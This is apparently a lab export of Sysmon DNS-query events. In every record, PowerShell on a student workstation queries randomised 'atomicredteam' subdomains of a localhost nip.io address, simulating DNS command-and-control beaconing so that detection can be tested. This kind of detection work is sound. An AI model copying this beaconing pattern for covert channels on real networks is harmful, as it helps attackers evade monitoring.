"2025-12-22 13:58:00.709 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165385,"Query: atomicredteam-852429.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:57:59.992","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:00.709 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165386,"Query: atomicredteam-578747.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:00.035","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:00.709 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165387,"Query: atomicredteam-683374.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:00.078","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:00.709 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165388,"Query: atomicredteam-685124.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:00.119","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:00.709 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165389,"Query: atomicredteam-144380.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:00.160","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:00.711 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165390,"Query: atomicredteam-157014.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:00.202","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:01.725 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165391,"Query: atomicredteam-144929.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:00.384","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:01.725 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165392,"Query: atomicredteam-815666.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:00.705","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:01.725 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165393,"Query: atomicredteam-130826.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:00.749","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:01.725 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165394,"Query: atomicredteam-19023.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:00.792","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:01.725 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165395,"Query: atomicredteam-629812.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:00.833","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:01.725 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165396,"Query: atomicredteam-272241.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:00.874","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:01.725 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165397,"Query: atomicredteam-972810.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:00.916","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:01.726 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165398,"Query: atomicredteam-504455.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:00.959","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:01.727 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165399,"Query: atomicredteam-495448.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:00.999","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:01.727 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165400,"Query: atomicredteam-872155.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:01.040","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:01.727 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165401,"Query: atomicredteam-322025.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:01.083","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:01.727 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165402,"Query: atomicredteam-390507.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:01.127","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:01.727 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165403,"Query: atomicredteam-932173.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:01.170","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:01.727 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165404,"Query: atomicredteam-647799.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:01.213","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:01.727 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165405,"Query: atomicredteam-656866.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:01.257","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:01.727 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165406,"Query: atomicredteam-291894.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:01.301","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:02.728 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165407,"Query: atomicredteam-568958.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:01.472","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:02.728 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165408,"Query: atomicredteam-32328.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:01.514","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:02.728 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165409,"Query: atomicredteam-511497.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:01.557","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.741 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165410,"Query: atomicredteam-576716.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:01.925","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.742 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165411,"Query: atomicredteam-29620.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:02.094","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.742 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165412,"Query: atomicredteam-682944.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:02.135","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.742 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165413,"Query: atomicredteam-152953.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:02.452","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.742 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165414,"Query: atomicredteam-628054.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:02.495","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.742 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165415,"Query: atomicredteam-363522.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:02.537","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.742 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165416,"Query: atomicredteam-557919.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:02.580","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.742 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165417,"Query: atomicredteam-691063.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:02.621","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.742 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165418,"Query: atomicredteam-776463.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:02.664","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.742 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165419,"Query: atomicredteam-821749.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:02.704","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.742 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165420,"Query: atomicredteam-461673.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:03.022","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.743 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165421,"Query: atomicredteam-174312.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:03.063","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.743 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165422,"Query: atomicredteam-328090.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:03.107","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.743 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165423,"Query: atomicredteam-668140.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:03.151","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.743 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165424,"Query: atomicredteam-498617.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:03.192","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.743 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165425,"Query: atomicredteam-893070.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:03.233","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.743 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165426,"Query: atomicredteam-363008.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:03.276","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.743 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165427,"Query: atomicredteam-82062.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:03.322","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.743 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165428,"Query: atomicredteam-868530.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:03.365","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.744 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165429,"Query: atomicredteam-311412.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:03.407","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.745 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165430,"Query: atomicredteam-814574.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:03.447","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.746 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165431,"Query: atomicredteam-109007.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:03.488","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.746 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165432,"Query: atomicredteam-908704.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:03.530","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:03.746 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165433,"Query: atomicredteam-826533.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:03.571","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
